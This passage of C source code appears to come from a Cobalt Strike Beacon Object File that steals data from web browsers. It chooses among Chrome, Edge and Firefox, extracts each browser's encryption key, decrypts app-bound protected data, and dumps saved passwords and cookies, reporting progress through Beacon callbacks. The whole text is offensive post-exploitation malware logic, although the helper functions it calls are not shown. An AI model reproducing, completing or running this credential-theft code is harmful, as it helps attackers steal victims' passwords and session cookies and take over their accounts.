            } else if (SHLWAPI$StrStrIA(browser_path, "edge") != NULL) {
                browser = "edge";
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "Browser not supported ;(");
                return;
            }
            //if cookie or login data only, then get the cookies and/or passwords and exit
            if (cookies || passwords) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] COOKIES/PASSWORDS ONLY SELECTED");
                GetBrowserData(browser, cookies, passwords, copyFile);
                return;
            }
            // Get All
            AppBoundDecryptor(browser_path, browser_pid);
            GetBrowserData(browser, cookies, passwords, copyFile);
            return;

        }

        BeaconPrintf(CALLBACK_OUTPUT, "[+] Dumping all supported browsers");
        for (int i = 0; i < sizeof(supported_browsers) / sizeof(supported_browsers[0]); i++) {
            browser = supported_browsers[i];
            BeaconPrintf(CALLBACK_OUTPUT, "===== Going for browser %s =====", browser);
            if (MSVCRT$strcmp(browser, "firefox") == 0){
                GetFirefoxInfo();
                continue;
            }
            GetEncryptionKey(browser);
            GetBrowserData(browser, cookies, passwords, copyFile);
        }
    } else {
        if (!isBrowserSupported(browser)) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Browser %s is currently not supported, if its chromium based try browser path\n", browser);
            return;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "===== Going for browser %s =====", browser);
        // Firefox Only
        if (MSVCRT$strcmp(browser, "firefox") == 0){
            GetFirefoxInfo();
            return;
        }

        // Get Key Only
        if (keys){
            BeaconPrintf(CALLBACK_OUTPUT, "[+] KEY ONLY SELECTED");
            GetEncryptionKey(browser);
            return;
        }
        // Get Login/Cookie (Without Decryption)
        if (cookies || passwords){
            BeaconPrintf(CALLBACK_OUTPUT, "[+] COOKIES/PASSWORDS ONLY SELECTED");
            GetBrowserData(browser, cookies, passwords, copyFile);
            return;
        }
        // Get All
        GetEncryptionKey(browser);
        GetBrowserData(browser, cookies, passwords, copyFile);
    }
}